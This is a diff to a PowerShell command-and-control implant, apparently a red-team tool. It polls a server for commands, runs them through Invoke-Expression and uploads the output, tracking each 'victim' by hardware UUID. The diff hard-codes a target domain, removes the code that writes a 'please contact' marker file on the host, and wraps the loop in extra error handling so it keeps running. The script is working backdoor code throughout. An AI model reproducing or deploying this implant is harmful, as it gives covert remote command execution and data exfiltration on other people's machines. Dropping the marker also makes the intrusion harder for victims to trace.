@@ -2,7 +2,7 @@ $server = "http://127.0.0.1:8080"
 $pollmin = 1
 $pollmax = 5
 $terminationdate = Get-Date -Date "2020-01-01 00:00:00"
-$targetdomain = "TARGETDOMAIN"
+$targetdomain = "CYBERIS"
 $markercontents = "If found, please contact XXX"
 $markerlocation = "$env:USERPROFILE\marker.txt"
 
@@ -18,8 +18,6 @@ if ((Get-Date)  -ge $terminationdate) {
     exit 2
 }
 
-# Write a marker file
-$markercontents | Out-File $markerlocation
 
 # Get UUID (will identify our victim)
 $uuid = get-wmiobject Win32_ComputerSystemProduct | Select-Object -ExpandProperty UUID
@@ -41,18 +39,23 @@ while((Get-Date)  -lt $terminationdate)
     # Make the request and execute using IEX
     try {
         $command = (New-Object Net.WebClient).DownloadString("$server/c?i=$uuid&t=$time")
-        if ($command) {
-            $output = Invoke-Expression ($command) | out-string 
+        try {
+            if ($command) {
+                $output = Invoke-Expression ($command) | out-string 
+            }
+        } 
+        catch {
+            $output = $_.Exception.message
         }
-    } 
-    catch {
-        $output = $_.Exception.message
-    }
     
-    if ($output) {
-        # Send back the output or error
-        Write-host "X"
-        (New-Object Net.WebClient).UploadString("$server/r?i=$uuid&t=$time",$output)
+        if ($output) {
+            # Send back the output or error
+            Write-host "X"
+            (New-Object Net.WebClient).UploadString("$server/r?i=$uuid&t=$time",$output)
+        }
+    }
+    catch {
+        Write-Host "~"
     }
 }
 
